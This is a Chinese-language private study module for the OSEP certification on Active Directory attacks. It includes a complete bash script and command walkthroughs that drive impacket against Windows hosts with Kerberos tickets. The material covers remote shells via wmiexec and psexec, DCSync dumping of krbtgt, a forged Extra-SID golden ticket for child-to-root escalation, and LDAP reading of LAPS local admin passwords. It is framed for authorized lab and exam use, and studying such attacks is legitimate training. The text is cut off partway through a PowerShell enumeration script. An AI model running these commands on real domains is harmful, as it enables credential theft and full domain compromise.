::: warning 私人教材 · 仅供授权实验与备考学习
本文是个人备考教材，仓库不公开。源码只用于 OSEP 官方实验/考试环境或你拥有书面授权的目标。禁止转发到公开网络、禁止对未授权系统使用。
:::

# 12 · AD 攻击：票据、委派、LAPS、信任与 ADCS（场景 47、49–55）

> 前置：按 [`docs/00-environment-and-infra.md`](/modules/00-environment-and-infra) 搭好攻击机目录、监听与投递。统一占位符 `LHOST LPORT TARGET DOMAIN USER PASS NTHASH PAYLOAD URL`。
> 教材依据与 cheat sheet（`reference/osep-cheatsheet.md`，下称 CS）对应：场景 47←C5/教材§19.3；49←C1；50←C1/教材21、23 章；51←C5/教材21、23 章；52←教材21、23 章；53←C5/教材21 章；54←教材§22.2.1；55←教材§22.2.2。CS 大节：`AD Enumeration`(≈L7768)、`AD Attacking`(≈L8251，含 Unconstrained Delegation L8253 / Golden Tickets L8394 / LAPS L8460)、`Kerberos`(≈L7071)。

**贯穿原则**：本模块八成工作发生在攻击机 Kali 上（impacket 套件 + certipy），只有"诱导认证/抓票"必须在目标 Windows 主机侧完成。先把「票据从哪来、要去哪个服务、以谁的身份」写清楚再动手——票据方向错了，命令再对也白搭。

| 场景 | 一句话目标 | 用到的脚本 |
|---|---|---|
| 47 | Linux 持票 → Windows 服务 | `m12-kerberos-tickets-linux.sh` |
| 49 | 读 LAPS → 本地管理员执行 | `m12-ad-enum-windows.ps1` / `m12-ad-enum-linux.sh` + `m12-laps-and-trust-notes.md` |
| 50 | 非约束委派抓 DC TGT → DCSync | `m12-delegation-attacks.ps1` |
| 51 | RBCD：写 `AllowedToAct` → 模拟管理员 | `m12-delegation-attacks.ps1` |
| 52 | 约束委派 S4U → 目标 SPN 服务 | `m12-delegation-attacks.ps1` |
| 53 | 子域 → 林根（信任判定 + Extra SID） | `m12-ad-enum-linux.sh` + `m12-laps-and-trust-notes.md` |
| 54 | ESC1 模板 → 证书认证 | `m12-adcs-esc1-esc8.sh` |
| 55 | ESC8 HTTP 注册中继 | `m12-adcs-esc1-esc8.sh` |

---

## 场景 47：Linux 上已有域票据，但你需要访问 Windows 服务

**场景回顾**：已控制一台加域 Linux，拥有有效可访问的 credential cache（ccache）或 keytab；下一跳是 Windows 域中的某个服务（SMB/WinRM/HTTP），没有明文密码。

**前提与假设**：Linux 时间与 DC 偏差 <5 分钟（Kerberos 硬性要求，先 `date` 对照）；攻击机可直连 DC 的 TCP/UDP 88 与目标的 445/5985；已知 `DOMAIN`（含 FQDN 大小写）与 DC 主机名/IP。注意：密钥分发必须用**域名全小写**、目标必须用**与 SPN 一致的 FQDN** 访问（不能用 IP）。

**准备（攻击机侧）**：
```bash
export KRB5CCNAME=/home/kali/osep/tickets/current.ccache   # 会话级，所有 -k 工具都读它
klist -e          # 看缓存里是谁的票据、加密类型（rc4/aes 决定能否被 DC 接受）
# kirbi(Rubeus)→ccache 转换；keytab→kinit 见 m12-kerberos-tickets-linux.sh
```
`/etc/krb5.conf` 最小模板与 `/etc/hosts`（`DC01.corp.local`、`TARGET` 的 FQDN 均要可解析）见 `scripts/linux/m12-kerberos-tickets-linux.sh`。

**执行步骤**：
```bash
# 1) 用 TGT/TGS 直接认证（-k 读 KRB5CCNAME，-no-pass 不再要密码）
smbclient -k -L //WS02.corp.local
impacket-wmiexec -k -no-pass DOMAIN/USER@WS02.corp.local     # 需 cifs/WS02 的 TGS，工具自动申请
impacket-secretsdump -k -no-pass DC01.corp.local             # 需 DC 机器票，先确认票据里是谁
evil-winrm -i ws02.corp.local -k                             # 走 Kerberos 需 wsman/WS02
# 2) 票据身份无目标服务访问权 → 用现有票去要别的服务的 TGS
#    （密钥在缓存里即可，不需要再输密码；详见脚本 ask_tgs 函数）
```
**用到的脚本**：`scripts/linux/m12-kerberos-tickets-linux.sh`（ccache/keytab 使用、格式转换、krb5.conf 模板、按服务要 TGS）。

**验证**：`smbclient -k -L //WS02` 能列出共享 / `wmiexec` 出 shell 即通过；`klist` 能看到新增 TGS。若报 `KRB_AP_ERR_MODIFIED`，多为票据主体与 SPN/加密类型不匹配，不是网络问题。

**失败分支与备选**：
- 缓存里有票但无法访问目标 → ① 检查目标 FQDN 是否与 SPN 一致（`smbclient -k -L //WS02` 换 `//ws02.corp.local`）；② 你的票主体是否被该服务 ACL 拒绝 → 换一个服务（WinRM 不开就 SMB）。
- KDC 报加密类型不支持 → `/etc/krb5.conf` 里对 `default_tkt_enctypes/default_tgs_enctypes` 加入 `rc4-hmac` 或补 `aes256-cts-hmac-sha1-96`，与 DC 支持集对齐。
- 时间偏差错误（`Clock skew too great`）→ `sudo ntpdate DC01` 或手动校准，偏差必须 <5 分钟。
- 跨网段访问内网 Windows 服务（目标只在内网段可达）→ 先做端口转发/Ligolo（[`docs/08-pivoting-tunneling.md`](/modules/08-pivoting-tunneling)），**转发后再 Kerberos**，注意转发路径上的机器也要能到 DC:88。

**考试注意 OPSEC**：先用无害动作验证票据身份（`smbclient -L`）再上执行类工具；ccache 文件按会话区分存放（`~/osep/tickets/`），防止把 A 域票据当 B 域用；所有 `-k` 工具都吃 `KRB5CCNAME`，切换票据必须显式 `export`，并在命令前 `klist` 确认。

---

#### 源码 `scripts/linux/m12-kerberos-tickets-linux.sh` {#scripts-linux-m12-kerberos-tickets-linux-sh}

````bash
#!/usr/bin/env bash
# =============================================================================
# 用途：Linux 侧 Kerberos 票据作业台——从「已有 ccache / keytab / kirbi」出发，
#       做票据查看、格式转换、TGT/TGS 申请，以及用 -k 去打 Windows 服务
#       （smbclient / wmiexec / psexec / smbexec / secretsdump / evil-winrm），
#       附带 /etc/krb5.conf 与 /etc/hosts·resolv 的最小可用模板。
# 场景：M12 场景 47（Linux 上已有域票据，需要访问 Windows 服务）；
#       也服务于 50/51/52/53（拿到票之后怎么用这些票落到 Windows 上）。
# 依赖：krb5-user（klist / kinit / kvno / ktutil，Kali: sudo apt install -y krb5-user）；
#       impacket（impacket-ticketConverter / -getTGT / -getST / -wmiexec / -psexec /
#       -smbexec / -secretsdump，Kali: sudo apt install -y impacket-scripts）；
#       smbclient（samba 客户端）；evil-winrm（gem install evil-winrm，可选）；
#       工具缺失时打印明确错误并给出安装提示，不静默退出。
# 使用：./m12-kerberos-tickets-linux.sh -m info -c ~/osep/tickets/current.ccache
#       ./m12-kerberos-tickets-linux.sh -m krb5conf -d corp.local -s DC01.corp.local -o /tmp/krb5.conf
#       ./m12-kerberos-tickets-linux.sh -m convert -T dc.kirbi -o dc.ccache
#       ./m12-kerberos-tickets-linux.sh -m auth -d corp.local -s DC01.corp.local -t WS02.corp.local
#       ./m12-kerberos-tickets-linux.sh -m tgs -S cifs/WS02.corp.local -d corp.local
# 占位符（全部经参数传入，脚本内不硬编码任何真实值）：
#   DOMAIN = 域 FQDN（-d，例 corp.local；REALM 自动取大写 CORP.LOCAL）
#   TARGET = DC/目标主机（-s / -t，例 DC01.corp.local、WS02.corp.local）
#   USER / PASS / NTHASH = 需要密码/哈希的场合（-u / -p / -H）
#   LHOST = 攻击机 IP（仅 -i 传 DC/CA 的 IP 时使用，用于 hosts 模板）
# 测试状态：未在真实域环境实测；本机 bash -n 通过。执行类模式默认打印命令，
#           加 -x 才真正执行（避免把未验证的命令直接打到考试环境）。
# 与 docs/12-ad-attacks.md 的差异说明：
#   1) 文档把 kirbi→ccache 与 keytab→kinit 都归到本脚本，实现里拆成 convert /
#      keytab 两个模式，参数分别为 -T/-o 与 -k/-u，与文档描述的行为一致。
#   2) 文档未提"按服务要 TGS"的具体命令，这里用 tgs 模式补齐（kvno 与
#      impacket-getST 两条路），对应文档"详见脚本 ask_tgs 函数"那句。
#   3) 跨域（子域→林根）步骤文档放在场景 53，本脚本提供 cross 模式做衔接打印，
#      黄金票本体命令在 scripts/infra/m12-laps-and-trust-notes.md。
# =============================================================================
set -u

MODE="info"
DOMAIN=""       # -d  域 FQDN
DC=""           # -s  DC 主机 FQDN
TGT_HOST=""     # -t  目标 Windows 主机 FQDN
USER=""         # -u
PASS=""         # -p
NTHASH=""       # -H
CCACHE=""       # -c  ccache 路径
KEYTAB=""       # -k  keytab 路径
TICKET=""       # -T  待转换票据（kirbi / ccache）
OUTFILE=""      # -o  输出文件
SPN=""          # -S  服务 SPN
DCIP=""         # -i  DC/目标 IP（仅 hosts 模板用）
EXEC=0          # -x  真正执行（默认只打印）
TICKET_DIR="$HOME/osep/tickets"

usage() {
    sed -n '2,32p' "$0" | sed 's/^# \{0,1\}//'
    cat <<'EOF'

参数：
  -m <mode>   作业模式（默认 info）：
       info      查看当前 KRB5CCNAME 与票据内容（klist -e）+ 时间偏差自检
       krb5conf  生成最小 /etc/krb5.conf 模板（-o 指定写出路径，默认只打印）
       hosts     生成 /etc/hosts 与 resolv 的解析模板（Kerberos 不能用 IP 访问）
       kinit     用明文密码取 TGT（kinit USER@REALM）
       keytab    ktutil 造 keytab 并用它 kinit（需要 -u 与 -p）
       convert   kirbi <-> ccache 互转（impacket-ticketConverter，需要 -T 与 -o）
       tgt       用密码/哈希取 TGT（impacket-getTGT，需要 -u 与 -p 或 -H）
       tgs       按服务申请 TGS（kvno；或 impacket-getST -spn，需要 -S）
       auth      用现有票打 Windows 服务：smbclient/wmiexec/psexec/smbexec/
                 secretsdump/evil-winrm 全套 -k 命令（需要 -d 与 -t）
       cross     Linux → Windows 的跨域（子域→林根）步骤打印与前置提示
       all       info + krb5conf + hosts + auth（冷启动一条龙）
  -d <fqdn>   域 FQDN（DOMAIN），多数模式必填
  -s <host>   DC 主机 FQDN（TARGET）
  -t <host>   目标 Windows 主机 FQDN（TARGET），auth 模式必填
  -u <user>   用户名（USER）
  -p <pass>   明文密码（PASS）
  -H <hash>   NTHASH（impacket 用）
  -c <path>   ccache 路径（覆盖 KRB5CCNAME）
  -k <path>   keytab 路径
  -T <path>   待转换票据文件（.kirbi / .ccache）
  -o <path>   输出文件（krb5conf / keytab / convert / tgt 用）
  -S <spn>    服务 SPN，如 cifs/WS02.corp.local（tgs 模式）
  -i <ip>     DC 或目标的 IP（LHOST 同网段写法，仅 hosts 模板用到）
  -x          真正执行命令（默认只打印，先核对再执行）
  -h          本帮助

退出码：0 正常 / 1 参数或依赖错误
EOF
    exit 0
}

err()  { printf '[!] %s\n' "$*" >&2; }
info() { printf '[*] %s\n' "$*"; }
head_() { printf '\n===== %s =====\n' "$*"; }
have() { command -v "$1" >/dev/null 2>&1; }

# 打印命令行：只对含空格/引号的参数加单引号，保证输出能直接复制执行
printable() {
    local out="" a
    for a in "$@"; do
        case "$a" in
            *" "*|*"'"*|*'"'*) out="$out '$a'" ;;
            *)                 out="$out $a" ;;
        esac
    done
    printf '%s\n' "${out# }"
}

# 打印（或执行）一条命令：先打印，再在 -x 时执行；缺命令给可读提示
run() {
    printable "$@"
    if [ "$EXEC" != "1" ]; then return 0; fi
    if ! have "$1"; then
        err "缺少命令：$1（Kali：sudo apt install -y krb5-user impacket-scripts samba-client）"
        return 0
    fi
    "$@" || err "上一条命令返回非零：按上面的输出排查（票据主体/SPN/加密类型/时间）"
    return 0
}

while getopts "m:d:s:t:u:p:H:c:k:T:o:S:i:xh" opt; do
    case "$opt" in
        m) MODE="$OPTARG" ;;
        d) DOMAIN="$OPTARG" ;;
        s) DC="$OPTARG" ;;
        t) TGT_HOST="$OPTARG" ;;
        u) USER="$OPTARG" ;;
        p) PASS="$OPTARG" ;;
        H) NTHASH="$OPTARG" ;;
        c) CCACHE="$OPTARG" ;;
        k) KEYTAB="$OPTARG" ;;
        T) TICKET="$OPTARG" ;;
        o) OUTFILE="$OPTARG" ;;
        S) SPN="$OPTARG" ;;
        i) DCIP="$OPTARG" ;;
        x) EXEC=1 ;;
        h) usage ;;
        *) usage ;;
    esac
done

# REALM 一律大写（Kerberos 要求）
REALM=""
if [ -n "$DOMAIN" ]; then
    REALM="$(printf '%s' "$DOMAIN" | tr '[:lower:]' '[:upper:]')"
fi

# ccache 默认值与导出：所有 -k 工具都读 KRB5CCNAME
if [ -n "$CCACHE" ]; then
    KRB5CCNAME="$CCACHE"
    export KRB5CCNAME
elif [ -n "${KRB5CCNAME:-}" ]; then
    CCACHE="$KRB5CCNAME"
else
    CCACHE="$TICKET_DIR/current.ccache"
fi

require_mode_arg() {
    local missing=""
    while [ "$#" -gt 0 ]; do
        case "$1" in
            DOMAIN) [ -z "$DOMAIN" ] && missing="$missing -d" ;;
            DC)     [ -z "$DC" ]     && missing="$missing -s" ;;
            TARGET) [ -z "$TGT_HOST" ] && missing="$missing -t" ;;
            USER)   [ -z "$USER" ]   && missing="$missing -u" ;;
            PASS)   [ -z "$PASS" ]   && missing="$missing -p" ;;
            SPN)    [ -z "$SPN" ]    && missing="$missing -S" ;;
            TICKET) [ -z "$TICKET" ] && missing="$missing -T" ;;
            OUTFILE)[ -z "$OUTFILE" ] && missing="$missing -o" ;;
        esac
        shift
    done
    if [ -n "$missing" ]; then
        err "模式 -m $MODE 缺少必填参数：$missing"
        err "（用 -h 查看各模式需要的参数）"
        exit 1
    fi
}

# ---------------------------------------------------------------------------
mode_info() {
    head_ "票据与会话自检（info）"
    info "KRB5CCNAME = ${KRB5CCNAME:-（未设置，工具会回退到 /tmp/krb5cc_UID）}"
    info "会话级导出：export KRB5CCNAME=$CCACHE"
    if [ ! -f "$CCACHE" ]; then
        err "ccache 文件不存在：${CCACHE}（先用 convert/tgt/kinit 模式产出，或 -c 指定正确路径）"
    fi
    run klist -e
    echo
    info "时间偏差检查（Kerberos 要求与 DC 相差 <5 分钟）："
    run date
    if [ -n "$DC" ]; then
        info "对照 DC 时间：nc -vz $DC 445 通了才能继续；校准：sudo ntpdate $DC"
        info "（ntpdate 不可用时：sudo rdate -n $DC 或 date -s 'YYYY-MM-DD HH:MM:SS'）"
    else
        info "给 -s DC01.corp.local 后可打印与 DC 的时间对照与校准命令"
    fi
    echo
    info "常见判定："
    info "  · klist 里 Default principal 决定『你是谁』，决定能访问哪些服务"
    info "  · etype 为 rc4-hmac / aes256-cts-hmac-sha1-96 时多数 DC 都接受"
    info "  · KRB_AP_ERR_MODIFIED 多为票据主体与 SPN 或加密类型不匹配，不是网络问题"
    info "  · Clock skew too great 就是时间偏了，先校时再重试"
}

# ---------------------------------------------------------------------------
mode_krb5conf() {
    require_mode_arg DOMAIN DC
    head_ "/etc/krb5.conf 最小模板（krb5conf）"
    local conf
    conf="$(cat <<EOF
[libdefaults]
    default_realm = $REALM
    dns_lookup_kdc = false
    dns_lookup_realm = false
    # 与 DC 支持集对齐：老环境只吃 rc4-hmac，新环境常用 aes256
    default_tkt_enctypes = rc4-hmac aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
    default_tgs_enctypes = rc4-hmac aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
    permitted_enctypes  = rc4-hmac aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
    udp_preference_limit = 1
    kdc_timesync = 1
    ccache_type = 4
    rdns = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true

[realms]
    $REALM = {
        kdc = $DC
        admin_server = $DC
        default_domain = $DOMAIN
    }

[domain_realm]
    .$DOMAIN = $REALM
    $DOMAIN = $REALM
EOF
)"
    printf '%s\n' "$conf"
    if [ -n "$OUTFILE" ]; then
        printf '%s\n' "$conf" > "$OUTFILE" \
            && info "已写出：${OUTFILE}（生效：sudo cp $OUTFILE /etc/krb5.conf）" \
            || err "写出失败：${OUTFILE}（只读？换 -o /tmp/krb5.conf）"
    else
        info "要落盘：加 -o /tmp/krb5.conf 再 sudo cp /tmp/krb5.conf /etc/krb5.conf"
        info "复制前先备份：sudo cp /etc/krb5.conf /etc/krb5.conf.bak"
    fi
    echo
    info "加密类型报错（KDC has no support for encryption type）时：把不需要的 etype 删到"
    info "只剩 rc4-hmac 再试；或反过来补上 aes256-cts-hmac-sha1-96。"
}

# ---------------------------------------------------------------------------
mode_hosts() {
    require_mode_arg DOMAIN DC
    head_ "名字解析模板（hosts）——Kerberos 必须用 FQDN，不能用 IP 直连"
    local ip1="$DCIP"
    [ -z "$ip1" ] && ip1="TARGET"
    echo "# /etc/hosts 追加（IP 用真实值替换 TARGET；FQDN 必须与 SPN 里的写法一致）"
    echo "$ip1    $DC    ${DC%%.*}"
    if [ -n "$TGT_HOST" ]; then
        echo "TARGET    $TGT_HOST    ${TGT_HOST%%.*}"
    fi
    echo
    echo "# 追加方式（需要 root）"
    echo "sudo sh -c 'echo \"$ip1    $DC    ${DC%%.*}\" >> /etc/hosts'"
    if [ -n "$TGT_HOST" ]; then
        echo "sudo sh -c 'echo \"TARGET    $TGT_HOST    ${TGT_HOST%%.*}\" >> /etc/hosts'"
    fi
    echo
    info "用域 DNS 而不是 hosts 时（更干净）："
    echo "sudo sh -c 'echo \"nameserver TARGET\" > /etc/resolv.conf'   # 先把 TARGET 换成 DC 的 IP"
    echo "# 或者临时：dig @TARGET $DC +short  验证解析是否返回正确 IP"
    echo
    info "验证：getent hosts $DC 应返回 IP；ping 不通不影响，只要解析对 + 88/445 可达即可"
    info "注意：/etc/hosts 一定要同时写 FQDN 与短名，否则部分工具拼不出 SPN"
}

# ---------------------------------------------------------------------------
mode_kinit() {
    require_mode_arg DOMAIN USER PASS
    head_ "用明文密码取 TGT（kinit）"
    info "REALM 必须大写：$REALM"
    run kinit "$USER@$REALM"
    echo
    info "提示：提示输入密码时粘贴 PASS；或（仅实验环境）printf 'PASS' | kinit $USER@$REALM"
    run klist -e
    echo
    info "续期：kinit -R（票据还在 renew 期内）"
}

# ---------------------------------------------------------------------------
mode_keytab() {
    require_mode_arg DOMAIN USER PASS
    local kt="$OUTFILE"
    [ -z "$kt" ] && kt="$TICKET_DIR/$USER.keytab"
    head_ "keytab 造票（keytab）-> $kt"
    echo "# ktutil 交互步骤（等价非交互见下）"
    echo "ktutil"
    echo "  addent -password -p $USER@$REALM -k 1 -e rc4-hmac"
    echo "  wkt $kt"
    echo "  quit"
    echo
    echo "kinit $USER@$REALM -k -t $kt"
    echo "klist -e"
    echo
    info "非交互写法（脚本里用 printf 喂给 ktutil）："
    echo "printf 'addent -password -p %s@%s -k 1 -e rc4-hmac\\n%s\\nwkt %s\\nquit\\n' \\" "$USER" "$REALM" "PASS" "$kt"
    echo "  | ktutil"
    echo
    info "ktutil 的 -e 要与 DC 支持的加密类型一致；rc4-hmac 兼容性最好。"
    info "造完 keytab 后记得：export KRB5CCNAME=$CCACHE 之前先 kinit 生成 ccache。"
    mkdir -p "$TICKET_DIR" 2>/dev/null || true
}

# ---------------------------------------------------------------------------
mode_convert() {
    require_mode_arg TICKET
    local out="$OUTFILE"
    [ -z "$out" ] && out="${TICKET%.*}.ccache"
    head_ "票据格式转换（convert）：$TICKET -> $out"
    case "$TICKET" in
        *.kirbi|*.kirby)
            info "kirbi(Rubeus/mimikatz 导出) -> ccache"
            run impacket-ticketConverter "$TICKET" "$out"
            ;;
        *.ccache)
            info "ccache -> kirbi（给 Windows 侧 Rubeus / mimikatz ptt 用）"
            run impacket-ticketConverter "$TICKET" "$out"
            ;;
        *.txt|*.b64)
            info "base64 TGT 文本（Rubeus monitor 输出）-> 先存成文件再转："
            echo "base64 -d $TICKET > ${TICKET%.*}.kirbi"
            run impacket-ticketConverter "${TICKET%.*}.kirbi" "$out"
            ;;
        *)
            err "无法从扩展名判断票据类型：${TICKET}（支持 .kirbi / .ccache / .txt）"
            err "显式给 -o 指定输出，脚本仍按 impacket-ticketConverter 处理"
            run impacket-ticketConverter "$TICKET" "$out"
            ;;
    esac
    echo
    info "转换后：export KRB5CCNAME=$out 然后 klist -e 确认主体（如 DC01\$）"
    info "Rubeus 侧 base64 -> 文件的注意：base64 串必须是单行，别把日志时间戳带进去"
}

# ---------------------------------------------------------------------------
mode_tgt() {
    require_mode_arg DOMAIN DC USER
    if [ -z "$PASS" ] && [ -z "$NTHASH" ]; then
        err "tgt 模式需要 -p PASS 或 -H NTHASH"; exit 1
    fi
    local out="$OUTFILE"
    [ -z "$out" ] && out="$TICKET_DIR/$USER.ccache"
    head_ "取 TGT（impacket-getTGT）-> $out"
    if [ -n "$NTHASH" ]; then
        run impacket-getTGT -dc-ip "$DC" -hashes ":$NTHASH" "$DOMAIN/$USER"
    else
        run impacket-getTGT -dc-ip "$DC" "$DOMAIN/$USER:$PASS"
    fi
    echo
    info "getTGT 默认产出 USER.ccache 在当前目录，用 -o 前先 mv 到票据目录："
    echo "mv $USER.ccache $out && export KRB5CCNAME=$out && klist -e"
    info "（impacket-getTGT 不支持 -o，输出名固定为 <用户名>.ccache）"
}

# ---------------------------------------------------------------------------
mode_tgs() {
    require_mode_arg SPN
    head_ "按服务申请 TGS（tgs）：$SPN"
    info "方式一（有 TGT 在缓存里，最干净）：kvno —— 直接用现有票向 KDC 要服务票"
    run kvno "$SPN"
    echo
    info "方式二（RBCD/约束委派需要 S4U 时用 impacket-getST，需要服务账户凭据）"
    if [ -n "$USER" ]; then
        local cred="$DOMAIN/$USER"
        [ -n "$PASS" ] && cred="$cred:$PASS"
        run impacket-getST -spn "$SPN" -dc-ip "$DC" "$cred"
    else
        echo "impacket-getST -spn $SPN -impersonate USER -dc-ip TARGET 'DOMAIN/SVC:PASS'"
    fi
    echo
    run klist -e
    info "确认 klist 里出现 $SPN 的服务票后，再用 -m auth 去访问对应服务。"
}

# ---------------------------------------------------------------------------
mode_auth() {
    require_mode_arg DOMAIN TARGET
    head_ "用现有票据打 Windows 服务（auth）——全部 -k -no-pass"
    info "前置：export KRB5CCNAME=$CCACHE   然后 klist -e 确认票里的主体是谁"
    local u="$USER"
    [ -z "$u" ] && u="USER"     # 未给 -u 时按占位符打印，票里是谁就以谁的身份走
    echo
    echo "# 1) 只读验证（先做这一步，确认票据身份够用再上执行类工具）"
    run smbclient -k -L "//$TGT_HOST"
    echo
    echo "# 2) 需要 cifs/TARGET 的 TGS（工具会自动申请）"
    run impacket-wmiexec -k -no-pass "$DOMAIN/$u@$TGT_HOST"
    run impacket-smbexec -k -no-pass "$DOMAIN/$u@$TGT_HOST"
    run impacket-psexec -k -no-pass "$DOMAIN/$u@$TGT_HOST"
    echo
    echo "# 3) DCSync（票里主体需要是 DC 机器账户或有复制权限的身份）"
    [ -z "$DC" ] && DC="$TGT_HOST"
    run impacket-secretsdump -k -no-pass "$DC"
    run impacket-secretsdump -k -no-pass -just-dc-user krbtgt "$DC"
    echo
    echo "# 4) WinRM（需要 wsman/TARGET 的 TGS）"
    run evil-winrm -i "$TGT_HOST" -r "$DOMAIN" -k
    echo
    info "没有 -k 但想用域用户密码/哈希时（对照用）："
    echo "impacket-wmiexec $DOMAIN/USER@$TGT_HOST -hashes :NTHASH"
    echo
    info "失败分支："
    info "  · smbclient 报 KRB_AP_ERR_MODIFIED -> FQDN 与 SPN 是否一致（别用短名/IP）"
    info "  · 报 KDC 不支持加密类型 -> 改 /etc/krb5.conf 的 enctypes（见 -m krb5conf）"
    info "  · Clock skew -> sudo ntpdate $DC"
    info "  · 目标只在内网段 -> 先做端口转发/Ligolo（docs/08），转发后再 Kerberos，"
    info "    且转发路径上的机器也要能到 DC 的 88"
}

# ---------------------------------------------------------------------------
mode_cross() {
    head_ "Linux -> Windows 跨域步骤（cross，场景 53 衔接）"
    info "① 先确认当前票属于哪个域：klist -e（Default principal 的后缀就是域）"
    run klist -e
    echo
    info "② 同域内横向：直接 -m auth（-d 用子域 FQDN，-t 用子域内主机 FQDN）"
    echo
    info "③ 子域 -> 林根：林的父子信任且未开 SID 过滤时，才谈得上 Extra SID 黄金票。"
    info "   判定与完整命令在 scripts/infra/m12-laps-and-trust-notes.md；核心三步："
    echo "   impacket-ticketer -nthash <子域krbtgt NT> -domain child.$DOMAIN \\"
    echo "       -domain-sid <子域SID> -extra-sid '<根域SID>-519' Administrator"
    echo "   export KRB5CCNAME=Administrator.ccache"
    echo "   impacket-secretsdump -k -no-pass <根DC FQDN>"
    echo
    info "④ /etc/hosts 必须同时能解析子域 DC 与根 DC 的 FQDN（-m hosts 生成）"
    info "⑤ 若信任是外部/林间（SID 过滤开启）-> Extra SID 无效，回到枚举找其他入口。"
}

# ---------------------------------------------------------------------------
case "$MODE" in
    info)     mode_info ;;
    krb5conf) mode_krb5conf ;;
    hosts)    mode_hosts ;;
    kinit)    mode_kinit ;;
    keytab)   mode_keytab ;;
    convert)  mode_convert ;;
    tgt)      mode_tgt ;;
    tgs)      mode_tgs ;;
    auth)     mode_auth ;;
    cross)    mode_cross ;;
    all)      mode_info; mode_krb5conf; mode_hosts; mode_auth ;;
    *)        err "未知模式：$MODE"; usage ;;
esac

printf '\n[*] 模式 %s 结束。默认只打印命令；加 -x 才会真正执行。\n' "$MODE"
info "下一步：拿到票 -> -m convert/tgs 加工 -> -m auth 落地；跨域看 -m cross。"
````

## 场景 49：没有本地提权路径，但当前域用户能读取 LAPS

**场景回顾**：初始会话是普通域用户；本机无提权点；但目录 ACL 允许读取**另一台机器**的本地管理员密码（LAPS）。目标：拿该机器本地管理员身份远程执行。

**前提与假设**：目标域已部署 LAPS 且当前用户对密码属性有读权限（部署时通常会授权给域用户组读取，或你通过 ACL/GenericRead 获得）；LAPS 密码是**目标机器本地 Administrator** 的密码，不是域用户。先分辨目标用的是**传统 LAPS（AdmPwd，属性 `ms-Mcs-AdmPwd*`）**还是 **Windows LAPS（属性 `msLAPS-Password*`）**，两种查询方式不同。

**准备（攻击机侧）**：确认能 LDAP 查询（`ldapsearch` 或 impacket）；准备远程执行模板（目标开 445 → `wmiexec/psexec`；只开 5985 → WinRM）。**Windows 侧**查询脚本：`scripts/powershell/m12-ad-enum-windows.ps1`。

**执行步骤**：
```bash
# 攻击机（Linux）直接 LDAP 读属性——先探测存在哪一版 LAPS（两个属性都查）
ldapsearch -x -H ldap://DC01.corp.local -D "CORP\\USER" -w 'PASS' \
  -b "DC=corp,DC=local" "(objectClass=computer)" \
  ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime msLAPS-Password msLAPS-EncryptedPassword
# 拿到明文后远程执行
impacket-wmiexec CORP/Administrator@WS02.corp.local -hashes :NTHASH   # 或 -p '密码'
```
Windows 侧（会话机）：`m12-ad-enum-windows.ps1 -Mode LAPS -ComputerName WS02`；两版命令速查见 `m12-laps-and-trust-notes.md`。

**用到的脚本**：`m12-ad-enum-windows.ps1`（LAPS 两版查询 + 枚举）、`m12-ad-enum-linux.sh`（LDAP 批量枚举含 LAPS 属性）、`m12-laps-and-trust-notes.md`（命令速查）。

**验证**：读到的密码能成功 `wmiexec`/`psexec` 进 WS02；若密码"看起来对但进不去"，先验证该密码是不是 WS02 的（LAPS 密码按机器区分），并确认远程执行协议开放。

**失败分支与备选**：
- 属性为空/读不到 → ① 该机器可能没启用 LAPS 或密码未过期重置，换机器枚举（一次查全域 `(ms-Mcs-AdmPwd=*)`）；② 当前用户确实无读权限 → 找本模块其他入口（RBCD/委派/证书）先提权到有读权限的身份。
- Windows LAPS 存的是 `msLAPS-EncryptedPassword`（加密值）→ 明文读取需 `Get-LapsADPassword`（解密由目标机密钥完成）或用 DC 侧 LAPS 模块；纯 LDAP 拿不到明文时**不要死磕**，换 `msLAPS-Password` 明文模式的机器，或回落到传统 LAPS 机器。
- 只开 WinRM 不开 SMB → 换 `evil-winrm`；两协议都不开 → LAPS 密码无用，回到枚举找其他入口。

**考试注意 OPSEC**：LAPS 查询会产生 LDAP 审计日志，属预期内枚举行为，但不要对全域做无差别密码 dump 后逐个乱试；执行目标只选场景需要的机器。密码字符串不要 echo 进 shell 历史可读的长命令里（用环境变量或脚本参数）。

---

#### 源码 `scripts/powershell/m12-ad-enum-windows.ps1` {#scripts-powershell-m12-ad-enum-windows-ps1}

````powershell
<#
用途：纯 ADSI / .NET 实现的域枚举（不依赖 RSAT ActiveDirectory 模块，也不依赖
      PowerView）——域信息与 MAQ、用户、组与特权组成员、计算机、SPN（Kerberoast
      候选）、三类委派属性、指定对象 ACL 摘要、LAPS 两版读取与可读性判定。
场景：M12 场景 49（读 LAPS）、51（RBCD 前置：找可写/可改委派属性的计算机对象）、
      52（确认服务账户的 msDS-AllowedToDelegateTo 与目标 SPN）、50（找非约束主机）。
      与 scripts/linux/m12-ad-enum-linux.sh 是同一件事的 Linux / Windows 两侧实现。
依赖：Windows PowerShell 2.0+ 自带 System.DirectoryServices（DirectoryEntry /
      DirectorySearcher）与 System.Security.Principal；无需管理员权限（写操作无）。
      建议 -Domain 显式给域 FQDN，否则用当前计算机所属域。
使用：.\m12-ad-enum-windows.ps1 -Mode All
      .\m12-ad-enum-windows.ps1 -Mode LAPS -ComputerName WS02
      .\m12-ad-enum-windows.ps1 -Mode Delegation
      .\m12-ad-enum-windows.ps1 -Mode ACL -AclTarget "CN=WS02,CN=Computers,DC=corp,DC=local"
      .\m12-ad-enum-windows.ps1 -Mode Users -MaxResults 50 -Domain corp.local
占位符：DOMAIN=域 FQDN（corp.local） TARGET=域名/主机名（WS02） USER=域用户名
      PASS=密码（本脚本只读枚举，不需要凭据；PASS 只在打印的后续命令里出现）
      ——运行前把上面占位符替换成考试环境的真实值，脚本内不硬编码任何真实值。
测试状态：未在 Windows 域环境实测；本机用括号/引号配对检查通过，逻辑按 ADSI 标准
      用法编写（等价于 cheat sheet "AD Enumeration / LDAP" 章节的命令）。
与 docs/12-ad-attacks.md 的差异说明：
  1) 文档写 `-Mode LAPS -ComputerName WS02`：本脚本 -ComputerName 可带或不带结尾
     的 `$`（WS02 与 WS02$ 都接受）；不给 -ComputerName 时枚举全域开了 LAPS 的机器。
  2) 文档把 ACL 摘要描述为"ACL 摘要"，本脚本 ACL 模式只做**读**取并高亮高危权限
     （GenericAll/GenericWrite/WriteDacl/WriteOwner/ExtendedRight），不做任何修改；
